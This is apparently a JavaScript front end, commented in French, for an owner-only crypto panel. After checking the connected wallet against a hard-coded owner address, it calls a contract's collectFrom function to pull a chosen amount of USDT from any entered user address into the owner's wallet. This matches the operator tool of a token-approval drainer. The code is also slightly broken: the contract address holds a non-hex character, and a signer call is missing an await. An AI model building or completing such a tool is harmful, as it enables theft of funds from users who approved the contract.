document.addEventListener("DOMContentLoaded", async () => {
const OWNER_ADDRESS = "0xeFca8571B257caf32742E2c706f2078309DC1293"; // Remplace par TON wallet
const CONTRACT_ADDRESS = "0xFFOA73e53a009Dcda14Cff1898a97C2CFe786E51"; // Ton smart contract
const USDT_DECIMALS = 6;
const info = document.getElementById("info");
const collectBtn = document.getElementById("collectBtn");

async function connectWallet() {
if (!window.ethereum) {
alert("Ouvre ce site via Trust Wallet ou MetaMask.");
return;
}
const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
if (accounts[0].toLowerCase() !== OWNER_ADDRESS.toLowerCase()) {
document.body.innerHTML = "❌ Accès refusé !";
throw new Error("Unauthorized");
}
return accounts[0];
}

collectBtn.addEventListener("click", async () => {
try {
const owner = await connectWallet();
const userAddress = document.getElementById("userAddress").value;
const amount = document.getElementById("amount").value;

if (!ethers.isAddress(userAddress)) {
alert("Adresse utilisateur invalide !");
return;
}
if (isNaN(amount) || Number(amount) <= 0) {
alert("Montant invalide !");
return;
}

const provider = new ethers.BrowserProvider(window.ethereum);
const signer = provider.getSigner();

const ABI = [
"function collectFrom(address from, uint256 amount) external"
];

const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);

const amountUnits = ethers.parseUnits(amount, USDT_DECIMALS);

info.innerHTML = "⏳ Transaction en cours...";
const tx = await contract.collectFrom(userAddress, amountUnits);
await tx.wait();

info.innerHTML = `✅ Transfert effectué : ${amount} USDT de ${userAddress} vers votre wallet.`;
} catch (err) {
console.error(err);
info.innerHTML = `❌ Erreur : ${err.message}`;
}
});

});
